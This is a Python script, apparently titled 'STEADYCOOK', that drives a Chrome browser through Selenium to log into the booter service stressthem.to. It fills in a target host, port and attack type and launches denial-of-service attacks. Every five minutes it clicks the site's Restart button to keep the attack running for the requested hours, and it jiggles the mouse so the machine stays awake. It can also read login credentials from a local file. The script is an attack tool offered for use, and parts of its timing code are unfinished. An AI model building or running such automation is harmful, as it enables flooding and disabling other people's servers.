# this file is designated to handle the complex commands for SC
import os
import sys
import time
import tabulate
import pyautogui
import configparser
from threading import Thread
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# read from configuration file
parser = configparser.ConfigParser()
parser.read('settings.ini')

# we can make a method to where the driver.title gets updated continuously 
# this way the user can just run the script and log in
# once the program detects the correct driver.title the automation can start

chrome_options = Options()
automatic_login = ''

# add method for custom port declarations incase steadycook is able to be passed through a proxy server
url = parser.get('TARGETS', 'unauthorized_url')
port = parser.get('DEBUGGER_SETTINGS', 'target_port')
address = parser.get('DEBUGGER_SETTINGS', 'target_address')
automatic_ini = parser.get('AUTOMATION_OPTIONS', 'automate_stressthem_login')
default_chrome_path = parser.get('PATHS', 'default_chrome_path')

chrome_options.add_experimental_option("debuggerAddress", f'{address}:{port}')
driver = webdriver.Chrome(f'{os.getcwd()}/chromedriver', chrome_options=chrome_options)

banner = '''

      :::::::: ::::::::::: ::::::::::     :::     :::::::::  :::   :::  ::::::::   ::::::::   ::::::::  :::    ::: 
    :+:    :+:    :+:     :+:          :+: :+:   :+:    :+: :+:   :+: :+:    :+: :+:    :+: :+:    :+: :+:   :+:   
   +:+           +:+     +:+         +:+   +:+  +:+    +:+  +:+ +:+  +:+        +:+    +:+ +:+    +:+ +:+  +:+     
  +#++:++#++    +#+     +#++:++#   +#++:++#++: +#+    +:+   +#++:   +#+        +#+    +:+ +#+    +:+ +#++:++       
        +#+    +#+     +#+        +#+     +#+ +#+    +#+    +#+    +#+        +#+    +#+ +#+    +#+ +#+  +#+       
#+#    #+#    #+#     #+#        #+#     #+# #+#    #+#    #+#    #+#    #+# #+#    #+# #+#    #+# #+#   #+#       
########     ###     ########## ###     ### #########     ###     ########   ########   ########  ###    ###       
                                                                    Pre Local Build v 0.2 ~ NoEntropy

'''

if automatic_ini == 'no':
    pass

elif automatic_ini == 'yes':
    # check for automatic login
    try:
        exists = os.path.isfile(f'{os.getcwd()}/clientauth.txt')
        if exists == 1:
            with open(f'{os.getcwd()}/clientauth.txt', 'r') as f:
                data = f.read()
                index = data.split(':')

            username = str(index[0])
            password = str(index[1])
            automatic_login = True
        
        # handle file errors incase file doesnt exist
        elif exists == 0:
            print('[ \033[0;33mINFO\033[0;m ] Target file \'clientauth.txt\' required for automatic login doesn\'t exist!')
            print('\nIn order to continue set \033[0;33m\'automate_stressthem_login\'\033[0;m inside of \'settings.ini\' to \'no\'')
            sys.exit(1)

    except Exception as error:
        print(str(error))
        sys.exit(1)

    else: # if user didnt opt in for automatic login
        automatic_login = None

def handle_login():
    global driver

    page_title = driver.title
    load_count = 0

    if page_title == 'Login':
        while page_title != 'Dashboard':
            load_count += 1
            print(f'[ \033[0;33mSTATUS\033[0;m ] steady_cook :: Waiting for driver.title to load \'Dashboard\' (LC={load_count})')
            time.sleep(3)
            page_title = driver.title
        
            if page_title == 'Dashboard':
                print('\ncook_handler.py => driver.title condition met :: Starting navagation phase', 
                    '==========================================================================', sep='\n')
                print('[ \033[0;32mOK\033[0;m ] Target driver.title page loaded as \'Dashboard\' was successful')

# setup and define methods for updating a new target
def parse_host_info(target, port, duration, atk_type):
    global url
    global driver
    global banner
    global username
    global password
    global page_title
    global automatic_login
    
    print(banner)
    
    # load page for the user
    print('[ \033[0;32mOK\033[0;m ] cook_handler => Attempting to load main page https://stressthem.to/login')
    driver.get(url)
    time.sleep(3)

    print("cook_handler.py => Loaded successfully")
    print("======================================")
    get_data = [target, port, duration, atk_type]

    for values in get_data:
        print(f'Recieved: \033[0;32m{values}\033[0;m')
    
    if automatic_login == True or automatic_ini == 'yes':
        print('[ \033[0;32mOK\033[0;m ] Executing \033[0;33mautomatic\033[0;m login functionality for remote chrome debugging browser')
        driver.find_element_by_xpath('/html/body/div[2]/main/div/form/div[1]/input').send_keys(str(username))
        driver.find_element_by_xpath('/html/body/div[2]/main/div/form/div[2]/input').send_keys(str(password))

        # driver.find_element_by_xpath('/html/body/div[2]/main/div/form/div[4]/button').click()
        login_element = driver.find_element_by_xpath('/html/body/div[2]/main/div/form/div[4]/button')
        driver.execute_script('arguments[0].click();', login_element)

        # handle captcha
        handle_login()
    
    elif automatic_login == None or automatic_ini == 'no':
        print('[ \033[0;32mOK\033[0;m ] Executing \033[0;33mmanual\033[0;m login functionality for remote chrome debugging browser')
        # wait for the user to manually fill out user-based forms
        handle_login()

    # navigate to /booter | define attack method
    print(f'[ \033[0;32mEXEC\033[0;m ] Executing main navagation method => Loading https://stressthem.to/booter\nPage title: {driver.title}')
    driver.find_element_by_xpath('/html/body/div/div[1]/ul/li[2]/a').click()
    driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[1]/div[2]/div[2]/select/option[3]').click()

    # transfer target, duration, and port to user-based forum
    driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/input').send_keys(str(target))
    driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/div[1]/input[1]').send_keys(str(port))
    driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/div[1]/input[2]').send_keys(str(300)) #max duration for free account
    
    # start attack automation
    element = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/button')
    driver.execute_script('arguments[0].click();', element)
    
    # set duration to 1 hour for testing purposes
    try:

        # need to set test case variables to speed up exception handling for iteration
        minutes_passed_five = 0 # 0 out of 12
        target_second_count = 0 # target count = 3,600 or 1 hour
        seconds_hour = 3600 # 1 hour
        duration_level = 3600 * int(duration)
        # max_interval_level = minutes_passed_five * int(duration)
        target_level = 12 * int(duration) # set target level to 12 (min attack is 1 hour)

        # need to get max_interval_level to 0 and subtract instead of append 1 each iteration

        print('\n[ \033[0;33mSTATUS\033[0;m ] Attack successfully started => Handling main time event execution method',
                '===================================================================================', sep='\n')

        while (minutes_passed_five != target_level) and (target_second_count != duration_level): # 300 x 12 = 3600 seconds = 1 hour, 300 seconds = 5 minutes
        
            print('[ \033[0;32mOK\033[0;m ] Mimicking mouse movements to prevent computer sleep')
            pyautogui.moveTo(100, 200, 0.5)
            pyautogui.moveTo(None, 500)
            pyautogui.moveTo(600, None, 0.5)
            pyautogui.moveTo(100, 100, 2, pyautogui.easeInQuad)

            print('[ \033[0;33mSTATUS\033[0;m ] Dormant state for program execution started. Resuming progress in \033[0;32m5\033[0;m minutes...')

            time.sleep(300)
            # Thread(target = target_interval).start()
            # Thread(target = mimick_movement).start()
        
            minutes_passed_five += 1
            target_second_count += 300 # 5 minutes passed

            # get time in minutes
            concurrent_duration = int(target_second_count / 60)
            determine_time = int(seconds_hour - target_second_count)
            # remaining_tl = int(determine_time / 60)

            remaining_tl = int(target_level) * 5 # amount of hours left in minutes
            hour_length = remaining_tl / 60 # remaining hours left if args.duration > 1
            min_length = remaining_tl / int(duration) - concurrent_duration
            # remaining_hrs = 60 - concurrent_duration
            
            # running into variable declartion issues, need to address calculating time passed and time
            # that is currently remaining for script execution


            # number_of_days = duration_level / (24 * 3600)
            # number_of_hours = (duration_level % (24 * 3600)) / 3600
            # number_of_minutes = (duration_level % (24 * 3600 * 3600)) / 60
            # number_of_seconds = (duration_level % (24 * 3600 * 3600 * 60)) / 60

            # cd_minutes = ((concurrent_duration % (24 * 3600 * 3600)) / 60)
            # n = remaining_tl # duration_level
            # day = n // (24 * 3600) 
  
            # n = n % (24 * 3600) 
            # hour = n // 3600
        
            # n %= 3600
            # minutes = n // 60
        
            # n %= 60
            # seconds = n 

            # # use remaining_tl to determine how many hours and minutes are left

            # # get target minutes
            # mock_cd = concurrent_duration
            # mock_cd %= 3600

            # # get target hours 
            # mock_ch = concurrent_duration
            # mock_cd = mock_cd % (24 * duration_level) # might have to set 3600 to duration_level
            
            # cd_minutes = mock_cd // 60
            # cd_hours = mock_ch // duration_level # might have to set 3600 to duration_level


            hour_length -= 1
            print(f'[ \033[0;32mINFO\033[0;m ] UPDATE: \033[0;32m{concurrent_duration}\033[0;m minute\'s passed since execution (\033[0;32m{int(hour_length)} hour(s) and {int(min_length)}\033[0;m minute\'s remaining)')
            time.sleep(2)

            # possibly set this to if hours_left and min_lef !
            # if remaining_tl > 60: # if time is set to greater than one hour
            #     print(f'{cd_hours} hour(s) and {cd_minutes} minutes passed ({hour} hour(s) and {minutes} minutes left )')
            #     print(f'[ \033[0;32mINFO\033[0;m ] UPDATE: \033[0;32m{concurrent_duration}\033[0;m minute\'s passed since execution (\033[0;32m{remaining_tl}\033[0;m minute\'s remaining)')
            #     time.sleep(2)
            
            # elif remaining_tl >= 120: # should just display hours left until a solution for this problem has been found
                # if int(min_length) == 0: # if 1 hour has passed
                #     hour_length -= 1
                #     print(f'[ \033[0;32mINFO\033[0;m ] UPDATE: \033[0;32m{int(hour_length)}\033[0;m hour(s) passed since execution (\033[0;32m{int(hour_length)} hour(s) remaining)')
                #     time.sleep(2)
                
                # # if only one hour remains
                # elif int(min_length) == 0 and int(hour_length) == 1:
                #     print(f'[ \033[0;32mINFO\033[0;m ] UPDATE: \033[0;32m{concurrent_duration}\033[0;m hour(s) passed since execution (\033[0;32m{int(hour_length)} hour(s) remaining)')
                #     time.sleep(2)

                # else:
                #     hour_length -= 1
                #     print(f'[ \033[0;32mINFO\033[0;m ] UPDATE: \033[0;32m{concurrent_duration}\033[0;m minute\'s passed since execution (\033[0;32m{int(hour_length)} hour(s) and {int(min_length)}\033[0;m minute\'s remaining)')
                #     time.sleep(2)

                # make method to handle proper time display when target time reaches below 1 hour

            # print(minutes_passed_five, target_second_count, duration_level)
            if (minutes_passed_five == target_level) and (target_second_count == duration_level):
                break

            else:
                # 60 secs in 1 minute, 3600 seconds in 1 hour 
                print(f'[ \033[0;32mOK\033[0;m ] Restarting {atk_type.upper()} attack on \033[0;32m{target}:{port}\033[0;m\n')
                time.sleep(1)
                
                # refresh current page
                print(f'[ \033[0;32mOK\033[0;m ] Attempting to refresh target page at {driver.current_url}')
                time.sleep(1)
                driver.refresh()
                time.sleep(3.5) # wait for browser to refresh and continue process

                # use javascript executor to bypass inline element separate from target button
                target_element = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[4]/div[2]/table/tbody/tr[2]/td[7]/button')
                if target_element.text == 'Restart':
                    driver.execute_script('arguments[0].click();', target_element)  
                else:
                    print('[ \033[0;31mFATAL\033[0;m ] Execution error :: Cannot verify XPath address for text on \'Restart\' button exists (sys_exit_1)')
                    sys.exit(1)
            

    except (KeyboardInterrupt, ConnectionResetError):
        time.sleep(3)
        # click 'stop attack' button, once attack is stopped button should say 'Restart'
        # abort_element = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[4]/div[2]/table/tbody/tr[2]/td[7]/button')
        # driver.execute_script('arguments[0].click();', abort_element)
        print(f'[ \033[0;32mOK\033[0;m ] cook_handler.py => Stopped \033[0;32m{atk_type.upper()}\033[0;m attack on \033[0;32m{target}:{port}\033[0;m')
        time.sleep(2)
        exit()
    else:
        print(f'[ \033[0;32mOK\033[0;m ] Remote \033[0;32m{atk_type.upper()}\033[0;m attack against \033[0;32m{target}:{port}\033[0;m')
        print(f'[ \033[0;32mSUCCESS\033[0;m ] Automated task finished at \033[0;32m{datetime.now()}\033[0;m')
        exit()

    # create infinite attack with While True:

# setup and define the methods for attacking an existing target
def parse_existing_host_info():
    pass

